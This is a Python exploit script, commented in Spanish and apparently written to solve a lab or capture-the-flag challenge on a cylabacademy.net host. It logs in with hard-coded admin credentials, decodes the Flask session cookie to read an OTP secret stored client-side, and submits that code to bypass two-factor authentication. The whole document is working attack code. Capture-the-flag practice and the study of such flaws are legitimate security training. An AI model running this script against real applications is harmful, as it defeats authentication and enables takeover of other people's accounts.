import requests
import base64
import zlib
import json

BASE_URL = "http://chatelaine.cylabacademy.net:45349"

def solve():
    s = requests.Session()
    
    # 1. Login inicial
    print("[*] 1. Enviando credenciales admin:apple@123...")
    r = s.post(f"{BASE_URL}/login", data={
        "username": "admin",
        "password": "apple@123"
    }, allow_redirects=True)
    
    cookie = s.cookies.get("session")
    print(f"[+] Cookie de sesión obtenida: {cookie}")
    
    # 2. Decodificar la cookie de Flask (formato zlib Base64)
    # Si empieza con '.', quitar el punto
    token = cookie
    if token.startswith('.'):
        token = token[1:]
        
    payload_b64 = token.split('.')[0]
    payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
    
    compressed_data = base64.urlsafe_b64decode(payload_b64)
    try:
        decompressed_json = zlib.decompress(compressed_data).decode('utf-8')
    except Exception:
        decompressed_json = compressed_data.decode('utf-8')
        
    session_data = json.loads(decompressed_json)
    print(f"\n[+] Datos extraídos de la sesión del cliente:")
    print(json.dumps(session_data, indent=2))
    
    otp = session_data["otp_secret"]
    print(f"\n[+] ¡CÓDIGO OTP (2FA) DESCUBIERTO!: {otp}")
    
    # 3. Enviar OTP a /two_fa
    print("[*] 2. Enviando OTP a /two_fa para completar el inicio de sesión...")
    r_final = s.post(f"{BASE_URL}/two_fa", data={"otp": otp}, allow_redirects=True)
    
    print("=" * 60)
    print("[+] CONTENIDO DE LA PÁGINA TRAS BYPASS DE 2FA:")
    print(r_final.text)
    print("=" * 60)

if __name__ == '__main__':
    solve()
